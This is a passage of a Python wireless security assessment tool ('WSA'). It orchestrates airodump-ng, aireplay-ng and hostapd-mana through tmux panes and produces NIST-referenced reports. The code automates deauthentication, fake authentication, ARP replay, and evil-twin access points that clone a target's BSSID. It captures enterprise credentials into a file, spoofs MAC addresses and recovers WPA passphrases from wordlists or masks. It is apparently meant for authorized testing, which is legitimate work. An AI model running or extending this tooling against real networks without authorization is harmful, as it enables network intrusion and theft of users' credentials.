            if f.get("recovered_at"): L.append(row("recovered", f["recovered_at"]))
            if f.get("source"):     L.append(row("source",     f["source"]))
            if f.get("notes"):      L.append(row("notes",      f["notes"]))
            L.append("")
    else:
        L.append(row("type", "none"))
        if phase == "capture":
            L.append(row("note", "capture phase — analysis pending"))
        else:
            L.append(row("note", "recovery attempted — no material recovered"))
        L.append("")

    if evidence:
        L.append(rule("evidence"))
        for label, name in evidence:
            L.append(row(label, name))
        L.append("")

    L.append(rule("remediation  (nist sp 800-53)"))
    for ctrl in remediation:
        L.append(f"       {WHT}{ctrl}{R}")

    # NIST family legend — families actually used in this report
    _fams = set()
    for _ctrl in remediation:
        for _m in re.finditer(r'\b([A-Z]{2})-\d+', _ctrl):
            _fams.add(_m.group(1))
    _fam_names = {
        "AC": "Access Control",
        "AU": "Audit and Accountability",
        "CA": "Assessment, Authorization, and Monitoring",
        "CM": "Configuration Management",
        "IA": "Identification and Authentication",
        "RA": "Risk Assessment",
        "SC": "System and Communications Protection",
        "SI": "System and Information Integrity",
        "SR": "Supply Chain Risk Management",
    }
    if _fams:
        L.append("")
        L.append(rule("nist control families used above"))
        for _f in sorted(_fams):
            L.append(f"         {_f} — {_fam_names.get(_f, '')}")
        L.append("")

    try:
        with open(out, "w") as f:
            for line in L:
                f.write(strip_ansi(line) + "\n")
    except Exception:
        return None
    return out

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 10 · MENUS
# ═══════════════════════════════════════════════════════════════════════════

def bootstrap_tmux():
    global SESSION
    # already inside tmux — adopt the current session name
    if os.environ.get("TMUX"):
        try:
            r = _tmux("display-message", "-p", "#S")
            if r.returncode == 0 and r.stdout.strip():
                SESSION = r.stdout.strip()
        except Exception:
            pass
        try:
            _apply_tmux_theme(force=True)
        except Exception:
            pass
        return

    script = os.path.abspath(__file__)
    _tmux("kill-session", "-t", SESSION)
    time.sleep(0.4)

    args_str = " ".join(shlex.quote(a) for a in sys.argv[1:])
    inner_cmd = f"clear; exec python3 {shlex.quote(script)}"
    if args_str:
        inner_cmd += f" {args_str}"

    # new-session with a command runs it via $SHELL -c (non-interactive)
    # — no interactive shell prompt is ever drawn.  Everything visible
    # in the pane from t=0 is what the engine itself prints.
    _tmux("new-session", "-d", "-s", SESSION, inner_cmd)
    _tmux("set-option", "-t", SESSION, "status", "off")
    _tmux("set-option", "-t", SESSION, "mouse", "on")
    _tmux("select-pane", "-t", f"{SESSION}:0.0", "-T", "WSA ENGINE")
    time.sleep(0.3)

    os.execvp("tmux", ["tmux", "attach-session", "-t", SESSION])

def ui_restore_and_exit():
    try:
        _startup_reset_macs()
    except Exception:
        pass
    restore()
    print()
    sys.exit(0)

def install_signals():
    signal.signal(signal.SIGINT,  lambda s, f: ui_restore_and_exit())
    signal.signal(signal.SIGTERM, lambda s, f: ui_restore_and_exit())
    signal.signal(signal.SIGHUP,  lambda s, f: ui_restore_and_exit())

def iw(*args):
    return subprocess.run(["iw", *args],
                          capture_output=True, text=True).stdout

def list_adapters():
    iface_phy = {}
    current = None
    for line in iw("dev").splitlines():
        if line.startswith("phy#"):
            current = line.strip().replace("#", "")
        elif "Interface" in line and current:
            parts = line.split()
            if len(parts) >= 2:
                iface_phy[parts[1]] = current

    phy_modes = {}
    current, in_modes = None, False
    for line in iw("phy").splitlines():
        if line.startswith("Wiphy "):
            current = line.split()[1]
            phy_modes[current] = set()
            in_modes = False
        elif "Supported interface modes" in line:
            in_modes = True
        elif in_modes:
            s = line.strip()
            if s.startswith("*"):
                phy_modes[current].add(s.lstrip("* ").strip())
            elif s:
                in_modes = False

    out = []
    for iface, phy in iface_phy.items():
        modes = phy_modes.get(phy, set())
        out.append({
            "iface":   iface,
            "phy":     phy,
            "modes":   modes,
            "monitor": "monitor" in modes,
            "ap":      "AP" in modes,
        })
    return out

def menu_adapter_settings():
    adapters = list_adapters()
    if not adapters:
        clear()
        print()
        print(f"  {ERR}no wireless adapters found{R}")
        print(f"       {WHT}check with: iw dev{R}")
        print()
        input(f"   {LBL}press ENTER to return ▸{R} ")
        return

    while True:
        clear()
        standard_header()
        print()
        print(rule("options"))
        print(f"       {WHT}1  set monitor / ap adapter{R}")
        print(f"       {WHT}2  set spoof adapter{R}")
        print()
        sys.stdout.flush()
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if choice == "0" or not choice:
            return
        elif choice == "1":
            _pick_adapter("monitor", adapters)
            adapters = list_adapters()
        elif choice == "2":
            _pick_adapter("spoof", adapters)
            adapters = list_adapters()

def _pick_adapter(role, adapters):
    if role == "monitor":
        current = MONITOR()
        key     = "monitor_adapter"
        hint    = "must support monitor + ap"
        allowed = [a for a in adapters if a["monitor"] and a["ap"]]
    else:
        current = SPOOF()
        key     = "spoof_adapter"
        hint    = "any wireless adapter"
        allowed = adapters

    while True:
        clear()
        standard_header()
        print()
        print(rule("options"))
        for i, a in enumerate(allowed, 1):
            caps = []
            if a["monitor"]: caps.append("monitor")
            if a["ap"]:      caps.append("AP")
            caps_s = " · ".join(caps) or "none"
            mark = "  ← current" if a["iface"] == current else ""
            print(f"       {WHT}{i:<3}{a['iface']:<10}{a['phy']:<8}{caps_s}{mark}{R}")
        print()
        sys.stdout.flush()

        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if choice == "0" or not choice:
            return
        if not choice.isdigit():
            continue
        n = int(choice) - 1
        if not (0 <= n < len(allowed)):
            continue
        iface = allowed[n]["iface"]
        cfg_set(key, value=iface)
        return

def menu_engine():
    set_pane_title("WSA MANUAL CONDUCTOR")
    clear()
    standard_header()
    print()
    print(rule("options"))
    print(f"       {WHT}1  capture session{R}")
    print(f"       {WHT}2  analysis session{R}")
    print(f"       {WHT}3  methodology{R}")
    print(f"       {WHT}4  adapter settings{R}")
    print(f"       {WHT}5  themes and layout{R}")
    print()
    sys.stdout.flush()

def engine_loop():
    bootstrap_tmux()
    set_pane_title("WSA ENGINE")
    install_signals()
    # reset any cloned MAC leftover from a crashed previous run
    _startup_reset_macs()

    while True:
        menu_engine()
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            ui_restore_and_exit()

        if choice == "0":
            ui_restore_and_exit()
        elif choice == "1":
            run_capture_session()
        elif choice == "2":
            run_analysis_console()
        elif choice == "3":
            run_methodology()
        elif choice == "4":
            menu_adapter_settings()
        elif choice == "5":
            theme_settings()

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 11 · DISPATCH
# ═══════════════════════════════════════════════════════════════════════════

def dispatch_role(role):
    table = {
        "capture":              run_capture_console,
        "mac":                  run_mac_console,
        "ping":                 run_ping_console,
        "deauth":               run_deauth_console,
        "fakeauth":             run_fakeauth_console,
        "arpreplay":            run_arpreplay_console,
        "evil_twin_personal":   run_evil_twin_personal_console,
        "evil_twin_enterprise": run_evil_twin_enterprise_console,
        "analyse":              run_analysis_console,
    }
    fn = table.get(role)
    if fn is None:
        sys.stderr.write(f"role not yet implemented: {role}\n")
        sys.exit(1)
    fn()

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 12 · AUTOMATED ASSESSMENT (CLI)
# ═══════════════════════════════════════════════════════════════════════════

_AUTO_MODE = False   # set by run_auto_assessment, read by _display_recovery_result
_AUTO_CAPTURE_ONLY = False  # True when no --wordlist / --mask supplied

def run_auto_assessment(args):
    """Automated assessment driven by CLI arguments."""
    if not _check_required_tools():
        return

    # reset any cloned MAC leftover from a crashed previous run
    _startup_reset_macs()

    global _AUTO_CAPTURE_ONLY
    _AUTO_CAPTURE_ONLY = (not args.wordlist and not args.mask)

    if args.wordlist:
        if not os.path.isfile(args.wordlist):
            print(f"\n {ERR}ERROR:{R} wordlist not found: {args.wordlist}\n")
            return
        cfg_set("wordlists_dir",    value=os.path.dirname(os.path.abspath(args.wordlist)))
        cfg_set("default_wordlist", value=os.path.basename(args.wordlist))
        cfg_set("default_mask",     value="")
    elif args.mask:
        if not _mask_valid(args.mask):
            print(f"\n {ERR}ERROR:{R} invalid mask: {args.mask!r}\n")
            print(f" {WHT}valid tokens:  ?l  ?u  ?d  ?s  ?a  ?1..?9{R}")
            print(f" {WHT}example:       --mask '?d?d?d?d?d?d?d?d'{R}\n")
            return
        cfg_set("default_mask",     value=args.mask)
        cfg_set("default_wordlist", value="")

    print(f" {LBL}►{R} Initializing automated assessment...")

    csv_file = run_recon()
    if not csv_file:
        return

    ok, procedure, action, target, panes = run_target_select(csv_file, auto_mode=True)
    if not ok or not target:
        print(f" {ERR}✗{R} Target selection failed.")
        return
    if not panes:
        print(f" {ERR}✗{R} Pane deployment failed (small terminal?).")
        return

    print(f" {RDY}✓{R} Panes deployed: {list(panes.keys())}")
    print(f" {LBL}►{R} Running automated {procedure} flow...")

    # patch_key_alias: normalize hyphens to underscores for runner lookup
    runner_key = procedure.replace("-", "_")
    runner     = FLOW_RUNNERS.get(runner_key) or FLOW_RUNNERS.get(procedure)
    if not runner:
        print(f" {ERR}✗{R} No automated runner for {procedure}")
        _kill_worker_panes()
        try:
            _restore_all_adapters()
        except Exception:
            pass
        return

    global _AUTO_MODE
    _AUTO_MODE = True
    result = False
    try:
        result = runner(target, panes)
    except KeyboardInterrupt:
        result = False
    except Exception as e:
        print(f" {ERR}✗{R} Flow error: {e}")
        result = False
    finally:
        _AUTO_MODE = False
        # regardless of how the flow ended, leave the machine clean:
        # kill worker panes, then force adapters back to managed mode
        # in case _flow_wrapup did not get that far.
        _kill_worker_panes()
        try:
            _restore_all_adapters()
        except Exception:
            pass

    # _flow_wrapup already generated the report on normal flow exit.
    # Only regenerate here as a safety net (e.g. flow crashed before wrapup).
    folder, _ = load_target()
    already_report = None
    if folder:
        matches = sorted(glob.glob(os.path.join(folder, "REPORT_*.txt")))
        if matches:
            already_report = matches[-1]

    if already_report:
        print(f"\n {LBL}►{R} Finalising report...")
        print(f" {RDY}✓{R} Report saved: {WHT}{already_report}{R}")
    else:
        print(f"\n {LBL}►{R} Generating report...")
        rpt = generate_report()
        if rpt:
            print(f" {RDY}✓{R} Report saved: {WHT}{rpt}{R}")
        else:
            print(f" {VAL}!{R} Report generation failed.")

    print(f"\n {RDY}✓{R} Assessment complete.")
    print(f" {LBL}►{R} Returning to main menu...")
    # auto flow returns to menu

def parse_cli_args():
    parser = argparse.ArgumentParser(
        prog="wsa",
        description="Wireless Security Assessment Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
notifications:
  The monitor and AP interfaces are loaded automatically from
  ~/.config/wsa/settings.json. To change them, run the tool without
  flags and go to menu 4 (adapter settings).

examples:
  sudo python3 wsa.py 
      Launch interactive manual conductor
  
  sudo python3 wsa.py --auto --wordlist /path/to/list.txt
      Launch automated assessment using a dictionary
  
  sudo python3 wsa.py --auto --mask "?d?d?d?d?d?d?d?d"
      Launch automated assessment using a mask
        """)

    parser.add_argument("--auto", action="store_true", help="Run automated assessment (non-interactive)")
    
    grp = parser.add_argument_group("recovery strategies")
    grp.add_argument("--wordlist", metavar="PATH", help="Path to dictionary wordlist")
    grp.add_argument("--mask", metavar="MASK", help="Hashcat-style mask pattern (?d?l?u)")

    parser.add_argument("--role", help=argparse.SUPPRESS)

    return parser.parse_args()

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 13 · HELPERS USED BY AUTOMATED FLOWS
# ═══════════════════════════════════════════════════════════════════════════

def _stop_capture_processes():
    """Stop airodump-ng on the monitor adapter."""
    iface = MONITOR()
    _sudo(["pkill", "-TERM", "-f", f"airodump-ng.*{iface}"], timeout=5)
    time.sleep(1.5)

def _kill_adapter_processes(iface):
    """Kill airodump / aireplay / hostapd on a specific interface."""
    if not _valid_iface(iface):
        return
    pattern = (f"airodump-ng.*{iface}|aireplay-ng.*{iface}"
               f"|hostapd.*{iface}|hostapd-mana.*{iface}")
    _sudo(["pkill", "-TERM", "-f", pattern], timeout=5)
    time.sleep(0.5)
def _wordlist_path():
    """Return path to configured wordlist or None."""
    wl = CFG.get("default_wordlist") or ""
    if not wl:
        return None
    d = CFG.get("wordlists_dir") or DEFAULTS["wordlists_dir"]
    if not os.path.isabs(d):
        d = os.path.join(BASE, d)
    path = wl if os.path.isabs(wl) else os.path.join(d, wl)
    if not os.path.exists(path):
        return None
    try:
        if os.path.getsize(path) == 0:
            return None
    except Exception:
        return None
    return path

def _mask_valid(m):
    """Validate a hashcat mask."""
    if not m or "?" not in m:
        return False
    valid_follow = set("ludsa123456789")
    i = 0
    while i < len(m):
        if m[i] == "?":
            if i + 1 >= len(m) or m[i + 1] not in valid_follow:
                return False
            i += 2
        else:
            i += 1
    return True

def _rogue_profile_for(ap_type):
    if ap_type == "enterprise":
        return "WPA2-EAP  ·  PMF capable"
    return "WPA2-PSK  ·  PMF capable"

def _write_evil_twin_conf(target, channel, ap_type):
    iface  = AP() or "wlan2"
    essid  = target["essid"]
    bssid  = target["bssid"]
    folder = target["folder"]
    base = [
        f"interface={iface}", "driver=nl80211",
        f"ssid={essid}", f"bssid={bssid}",
        f"channel={channel}", "hw_mode=g", "wpa=2", "auth_algs=3",
    ]
    if ap_type == "enterprise":
        extra = [
            "wpa_key_mgmt=WPA-EAP", "wpa_pairwise=CCMP", "rsn_pairwise=CCMP",
            "ieee8021x=1", "eap_server=1",
            "eap_user_file=/etc/hostapd-mana/certs/hostapd.eap_user",
            "ca_cert=/etc/hostapd-mana/ca.pem",
            "server_cert=/etc/hostapd-mana/server.pem",
            "private_key=/etc/hostapd-mana/server.key",
            "dh_file=/etc/hostapd-mana/certs/dhparam.pem",
            "mana_wpe=1", "mana_eapsuccess=1",
            f"mana_credout={folder}/credentials.txt",
        ]
    elif ap_type == "wpa3":
        extra = [
            "wpa_pairwise=CCMP", "rsn_pairwise=CCMP",
            "ieee80211w=1",
            "wpa_passphrase=downgrade123",
        ]
    else:
        extra = [
            "wpa_key_mgmt=WPA-PSK", "wpa_pairwise=CCMP", "rsn_pairwise=CCMP",
            "wpa_passphrase=downgrade123",
        ]
    text = "\n".join(base + extra) + "\n"
    try:
        _sudo(["rm", "-f", CONF_PATH], timeout=3)
        with open(CONF_PATH, "w") as f:
            f.write(text)
        return True
    except Exception:
        return False

def _hostapd_running(iface=None):
    try:
        r = subprocess.run(["pgrep", "-a", "-f", "hostapd"],
                           capture_output=True, text=True, timeout=2)
        if not r.stdout.strip():
            return False
        if iface is None:
            return True
        for line in r.stdout.splitlines():
            if CONF_PATH in line or iface in line:
                return True
        return False   # no hostapd on this interface
    except Exception:
        return False

def _prep_ap_interface(iface, log=None, target_bssid=None):
    if not iface or not _valid_iface(iface):
        return False
    if log: log("status", f"killing capture tools on {iface}")
    _sudo(["pkill", "-TERM", "-f", f"airodump-ng.*{iface}"], timeout=5)
    _sudo(["pkill", "-TERM", "-f", f"aireplay-ng.*{iface}"], timeout=5)
    time.sleep(0.8)
    if log: log("status", "killing prior hostapd")
    _sudo(["pkill", "-TERM", "-f", "hostapd"], timeout=5)
    for _ in range(10):
        r = subprocess.run(["pgrep", "-f", "hostapd"],
                           capture_output=True, text=True)
        if not r.stdout.strip(): break
        time.sleep(0.3)
    _sudo(["pkill", "-KILL", "-f", "hostapd"], timeout=5)
    time.sleep(0.4)
    if log: log("status", f"ip link set {iface} down")
    _sudo(["ip", "link", "set", iface, "down"])
    time.sleep(0.5)
    # clear promisc/allmulticast residue before AP transition
    if log: log("status", f"clear promisc on {iface}")
    _sudo(["ip", "link", "set", iface, "promisc", "off"])
    _sudo(["ip", "link", "set", iface, "allmulticast", "off"])
    time.sleep(0.3)
    # clone target BSSID onto the rogue interface MAC.  hostapd
    # requires the interface MAC to match bssid= in the config or
    # it refuses to start ("Could not set BSSID").
    if target_bssid:
        if log: log("status", f"clone BSSID {target_bssid} → {iface}")
        _sudo(["ip", "link", "set", iface, "address", target_bssid])
        time.sleep(0.3)
    _sudo(["nmcli", "dev", "set", iface, "managed", "no"])
    time.sleep(0.2)
    if log: log("status", f"iw dev {iface} set type __ap")
    _sudo(["iw", "dev", iface, "set", "type", "__ap"])
    time.sleep(0.4)
    if log: log("status", f"ip link set {iface} up")
    _sudo(["ip", "link", "set", iface, "up"])
    time.sleep(1.2)
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=2)
        if "type ap" not in r.stdout.lower():
            if log: log("warn", f"{iface} not in AP mode after prep")
            return False
    except Exception:
        return False
    if log: log("success", f"{iface} ready in AP mode")
    return True

def _usb_bus_id(iface):
    try:
        dev_path = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "/usb" not in dev_path: return None
        return os.path.basename(dev_path).split(":")[0]
    except Exception: return None
def _verify_interface_exists(iface):
    try:
        r = subprocess.run(["ip", "link", "show", iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        return r.returncode == 0
    except Exception: return False

def _reset_wifi_adapter(iface, log=None):
    if not iface: return False
    if log: log("action", f"software replug of {iface}")
    _sudo(["pkill", "-TERM", "-f", f"airodump-ng.*{iface}"], timeout=5)
    _sudo(["pkill", "-TERM", "-f", f"aireplay-ng.*{iface}"], timeout=5)
    _sudo(["pkill", "-TERM", "-f", "hostapd"], timeout=5)
    time.sleep(0.6)
    bus_id = _usb_bus_id(iface)
    if bus_id:
        _sudo(["sh", "-c",
               f"echo -n '{bus_id}' > /sys/bus/usb/drivers/usb/unbind"], timeout=10)
        time.sleep(2.5)
        _sudo(["sh", "-c",
               f"echo -n '{bus_id}' > /sys/bus/usb/drivers/usb/bind"], timeout=10)
        for _ in range(30):
            if _verify_interface_exists(iface):
                time.sleep(2.0)
                if log: log("success", f"{iface} returned after USB reset")
                return True
            time.sleep(0.5)
    return False

def _activate_evil_twin(pane, log, iface=None, max_tries=2, context="", target_bssid=None):
    for attempt in range(1, max_tries + 1):
        log("action", f"preparing rogue AP{context}  ·  attempt {attempt}/{max_tries}")
        if not _prep_ap_interface(iface, log=log, target_bssid=target_bssid):
            if attempt < max_tries:
                log("warn", "interface prep failed · retrying")
                time.sleep(1.5)
                continue
            return False
        if not _wait_for_worker_ready(pane, "activate rogue AP", timeout=8):
            log("warn", "worker pane not ready")
        _pane_send(pane, "2", "Enter")
        appeared = False
        for _ in range(20):
            time.sleep(1)
            if _hostapd_running(iface):
                appeared = True
                break
        if appeared:
            log("success", "hostapd running")
            return True
        log("warn", f"hostapd not detected{context}  ·  attempt {attempt}/{max_tries}")
        if attempt < max_tries and iface:
            _reset_wifi_adapter(iface, log=log)
            time.sleep(2.0)
    return False

def _wait_for_worker_ready(pane, marker, timeout=12):
    # case-insensitive: rule() upper-cases headers, so a caller that
    # passes "targets" would never match a pane showing "TARGETS".
    deadline = time.time() + timeout
    while time.time() < deadline:
        if marker.lower() in _capture_pane(pane, 60).lower():
            return True
        time.sleep(0.25)
    # timeout — record for post-run debugging
    try:
        with open(DEBUG_LOG, "a") as f:
            f.write(f"{time.strftime('%H:%M:%S')}  "
                    f"WORKER READY TIMEOUT pane={pane} "
                    f"marker={marker!r} timeout={timeout}s\n")
    except Exception:
        pass
    return False

def _capture_pane(pane, lines=200):
    r = _tmux("capture-pane", "-p", "-t", pane, "-S", f"-{lines}")
    return r.stdout if r.returncode == 0 else ""

def _pane_send(pane, *keys):
    for k in keys:
        _tmux("send-keys", "-t", pane, k)

def _nm_reassociate(iface, log=None, timeout=45):
    if log: log("status", f"nm: reattach {iface}")
    _sudo(["nmcli", "dev", "set", iface, "managed", "yes"])
    time.sleep(0.5)
    _sudo(["systemctl", "restart", "NetworkManager"], timeout=25)
    time.sleep(2)
    if log: log("status", f"nm: waiting for {iface} to associate")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = subprocess.run(["nmcli", "-t", "-f", "DEVICE,STATE", "dev", "status"],
                               capture_output=True, text=True, timeout=3)
            for line in r.stdout.splitlines():
                if line.startswith(f"{iface}:"):
                    state = line.split(":", 1)[1]
                    if state == "connected":
                        if log: log("success", f"{iface} re-associated")
                        return True
                    break
        except Exception:
            pass
        time.sleep(1)
    return False

def _flow_wrapup(target, flow, log):
    time.sleep(1)
    log("blank", "")
    log("body", f"{WHT}stopping any lingering processes{R}")
    _kill_adapter_processes(MONITOR())
    if AP() != MONITOR():
        _kill_adapter_processes(AP())
    time.sleep(1)
    log("body", f"{WHT}generating report{R}")
    rpt = generate_report()
    if rpt:
        log("body", f"{RDY}report → {os.path.basename(rpt)}{R}")
    log("body", f"{WHT}tightening credential file permissions{R}")
    _tighten_credential_perms(target["folder"])
    log("body", f"{WHT}resetting adapters{R}")
    _restore_all_adapters()
    log("body", f"{RDY}adapters reset{R}")
    log("blank", "")
    log("body", f"{WHT}{flow} procedure complete{R}")
    _hold_briefly(3, "closing panes")
    _kill_worker_panes()

def _reset_spoof_mac():
    """Restore the spoof adapter's permanent hardware MAC.

    Called at the START of _restore_all_adapters.  Without this, wlan0
    keeps the client MAC from the last spoof, and the next non-OPEN
    target refuses to associate.

    Only acts when current MAC differs from hardware MAC — a no-op on
    runs where no spoofing occurred.
    """
    sp = SPOOF()
    if not _valid_iface(sp):
        return
    try:
        hw  = original_mac(sp)
        cur = current_mac(sp)
        if not hw or not cur or hw == cur:
            return
        _sudo(["nmcli", "dev", "set", sp, "managed", "no"], timeout=5)
        time.sleep(0.3)
        _sudo(["ip", "link", "set", sp, "down"], timeout=5)
        time.sleep(0.4)
        _sudo(["ip", "link", "set", sp, "address", hw], timeout=5)
        time.sleep(0.4)
        _sudo(["ip", "link", "set", sp, "up"], timeout=5)
        time.sleep(0.4)
    except Exception:
        pass

def _startup_reset_macs(log=None):
    """At engine startup, ensure no cloned MAC survives from a previous
    crashed run.  Kills any orphan hostapd/airodump first, then resets
    MACs to hardware values.  Only touches interfaces whose MAC is
    actually cloned \u2014 clean interfaces are left in whatever mode
    they're in.
    """
    # kill orphan processes that might be holding interfaces;
    # sleep only when something was actually killed
    killed_any = False
    for pname in ("hostapd", "airodump-ng", "aireplay-ng"):
        r = _sudo(["pgrep", "-f", pname], timeout=2, quiet=False)
        if r and r.stdout.strip():
            _sudo(["pkill", "-TERM", "-f", pname], timeout=5)
            killed_any = True
    if killed_any:
        time.sleep(1.0)

    for iface in {SPOOF(), MONITOR(), AP()}:
        if not _valid_iface(iface):
            continue
        try:
            hw  = original_mac(iface)
            cur = current_mac(iface)
            if not hw or not cur:
                continue
            if hw == cur:
                if log: log("status", f"{iface} MAC already clean ({hw})")
                continue
            if log: log("status", f"resetting {iface} MAC: {cur} \u2192 {hw}")
            _sudo(["nmcli", "dev", "set", iface, "managed", "no"], timeout=5)
            time.sleep(0.2)
            _sudo(["ip", "link", "set", iface, "down"], timeout=5)
            time.sleep(0.4)
            _sudo(["ip", "link", "set", iface, "address", hw], timeout=5)
            time.sleep(0.4)
            _sudo(["ip", "link", "set", iface, "up"], timeout=5)
            time.sleep(0.4)
            if iface != MONITOR():
                _sudo(["nmcli", "dev", iface, "set", "managed", "yes"], timeout=5)
        except Exception:
            pass

def _restore_all_adapters():
    for iface in {MONITOR(), AP(), SPOOF()}:
        if not _valid_iface(iface): continue
        # skip if already in target state (managed + hardware MAC);
        # second call after _flow_wrapup is a no-op instead of ~1.5s
        try:
            hw  = original_mac(iface)
            cur = current_mac(iface)
            r   = subprocess.run(["iw", "dev", iface, "info"],
                                 capture_output=True, text=True, timeout=2)
            if ("type managed" in r.stdout.lower()
                    and hw and cur and hw.upper() == cur.upper()):
                continue
        except Exception:
            pass
        try:
            _sudo(["ip", "link", "set", iface, "down"], timeout=5)
            # clear promisc/allmulticast residue from monitor/AP mode.
            # rtw88 leaves these set after type changes, causing the
            # interface to sit in a half-monitor state that blocks
            # scanning and re-association until manually cleared.
            _sudo(["ip", "link", "set", iface, "promisc", "off"], timeout=5)
            _sudo(["ip", "link", "set", iface, "allmulticast", "off"], timeout=5)
            time.sleep(0.3)
            _sudo(["iw", "dev", iface, "set", "type", "managed"], timeout=5)
            time.sleep(0.3)
            # reset cloned MAC (BSSID clone from evil twin prep, or
            # spoof MAC from OPEN flow) back to hardware value so the
            # next run boots clean.
            hw = original_mac(iface)
            if hw:
                _sudo(["ip", "link", "set", iface, "address", hw], timeout=5)
                time.sleep(0.3)
            _sudo(["ip", "link", "set", iface, "up"], timeout=5)
            # monitor adapter is permanently unmanaged \u2014 do not fight it
            if iface != MONITOR():
                _sudo(["nmcli", "dev", iface, "set", "managed", "yes"],
                      timeout=5)
        except Exception:
            pass
        time.sleep(0.2)

def _flow_steps(flow):
    """Return step definitions, handling hyphen/underscore variants."""
    if flow in FLOW_STEPS:
        return FLOW_STEPS[flow]
    alt = flow.replace("-", "_")
    if alt in FLOW_STEPS:
        return FLOW_STEPS[alt]
    alt = flow.replace("_", "-")
    if alt in FLOW_STEPS:
        return FLOW_STEPS[alt]
    return {"steps": []}

FLOW_STEPS = {
    "OPEN": {"steps": [
        {"label": "1", "name": "Capture", "panel": "PANEL 1 CAPTURE"},
        {"label": "2", "name": "Spoof",   "panel": "PANEL 2 MAC"},
        {"label": "3", "name": "Deauth",  "panel": "PANEL 3 DEAUTH"},
        {"label": "4", "name": "Confirm", "panel": "PANEL 4 CONFIRM"},
    ]},
    "WEP": {"steps": [
        {"label": "1", "name": "Capture",     "panel": "PANEL 1 CAPTURE"},
        {"label": "2", "name": "Fake Auth",   "panel": "PANEL 2 FAKEAUTH"},
        {"label": "3", "name": "ARP Replay",  "panel": "PANEL 3 ARPREPLAY"},
        {"label": "4", "name": "Harvest IVs", "panel": "PANEL 1 CAPTURE"},
        {"label": "5", "name": "Recover Key", "panel": "CONDUCTOR"},
    ]},
    "WPA_PERSONAL": {"steps": [
        {"label": "1", "name": "Deploy Evil Twin", "panel": "PANEL 1 EVIL_TWIN"},
        {"label": "2", "name": "Extract Hashes",   "panel": "PANEL 1 EVIL_TWIN"},
        {"label": "3", "name": "Recover Passphrase", "panel": "CONDUCTOR"},
    ]},
    "WPA3": {"steps": [
        {"label": "1", "name": "Deploy Evil Twin", "panel": "PANEL 1 EVIL_TWIN"},
        {"label": "2", "name": "Extract Hashes",   "panel": "PANEL 1 EVIL_TWIN"},
        {"label": "3", "name": "Recover Passphrase", "panel": "CONDUCTOR"},
    ]},
    "ENTERPRISE": {"steps": [
        {"label": "1", "name": "Deploy Evil Twin + RADIUS", "panel": "PANEL 1 EVIL_TWIN"},
        {"label": "2", "name": "Extract Credentials",       "panel": "PANEL 1 EVIL_TWIN"},
        {"label": "3", "name": "Recover Credentials",       "panel": "CONDUCTOR"},
    ]},
}

_status_active = False

def _status_write(text):
    global _status_active
    if _AUTO_MODE:
        return
    sys.stdout.write("\r\033[K  " + LBL + text + R)
    sys.stdout.flush()
    _status_active = True

def _status_clear():
    global _status_active
    if _status_active:
        sys.stdout.write("\r\033[K")
        sys.stdout.flush()
        _status_active = False
def _flow_header(target, flow, steps):
    """Open the auto-flow log file and draw the static procedure view
    on the master pane.  Step-by-step logging goes to the log file
    only; stdout is untouched so the master stays exactly as drawn in
    manual mode.  Operator watches progress in the worker panes.
    """
    log_path = os.path.join(target["folder"], f"procedure_{flow.lower()}.log")
    try:
        with open(log_path, "w") as f:
            f.write(f"# WSA {flow} procedure log\n")
            f.write(f"# target : {target.get('essid', '?')} "
                    f"({target.get('bssid', '?')})\n")
            f.write(f"# start  : {time.ctime()}\n\n")
    except Exception:
        log_path = None

    # static procedure view already drawn by run_target_select;
    # no redraw here — _proc_key was undefined and the NameError
    # was silently swallowed by the previous except handler

    total_steps = len(steps)

    def log(kind, msg="", panel=None):
        if log_path:
            try:
                with open(log_path, "a") as f:
                    f.write(f"{time.strftime('%H:%M:%S')}  "
                            f"[{kind:<8}]  {msg}\n")
            except Exception:
                pass

    return log, total_steps

def _show_step(log, flow, n, body_lines=None):
    """Print one step using manual-mode vocabulary: [N] NAME · step N/M."""
    steps    = _flow_steps(flow)["steps"]
    step_def = steps[n - 1]
    label    = step_def.get("label") or f"{n}"
    log("blank", "")   # separator — one blank line before each step
    log("step", f"[{label}] {step_def['name'].upper()}  ·  step {n}/{len(steps)}",
        panel=step_def["panel"])
    if body_lines:
        for line in body_lines:
            log("body", line)

def _show_event(log, msg):
    # silent — event markers removed from auto log
    pass

def _wait_with_countdown(label, timeout, condition_fn):
    start = time.time()
    while True:
        elapsed   = time.time() - start
        remaining = max(0, timeout - int(elapsed))
        mm, ss    = divmod(remaining, 60)
        _status_write(f"{label}  ·  {mm:02d}:{ss:02d}")
        val = condition_fn()
        if val:
            _status_clear()
            return val
        if elapsed >= timeout:
            _status_clear()
            return None
        time.sleep(1)

def _wait_for_station(target, log, pane_deauth=None):
    """Wait for a station, up to station_wait_cycles cycles.
    Returns (station_mac_or_None, cycles_used).
    """
    max_cycles = THR("station_wait_cycles")
    cycle      = 0
    station    = None
    while cycle < max_cycles and station is None:
        cycle += 1
        result = _wait_with_countdown(
            f"waiting for client  ·  cycle {cycle}/{max_cycles}",
            timeout=THR("station_timeout"),
            condition_fn=lambda: (_station_poll(target) or None))
        if result:
            station = result[0]
            break
        if pane_deauth:
            _pane_send(pane_deauth, "1", "Enter")
        time.sleep(2)
    return station, cycle

def _hold_briefly(seconds=5, label="continuing"):
    # silent no-op in auto mode — the recovery card already serves
    # as the acknowledgement point
    if _AUTO_MODE:
        return
    for remaining in range(seconds, 0, -1):
        _status_write(f"{label}  ·  {remaining:02d}s")
        time.sleep(1)
    _status_clear()

def _hold_until_enter():
    try:
        input(f"\n {LBL}press ENTER to close worker panes ▸{R} ")
    except (KeyboardInterrupt, EOFError):
        pass

def _parse_stations(csv_file, bssid):
    stations = []
    # skip our own adapters — wlan0 probing for or joining an open
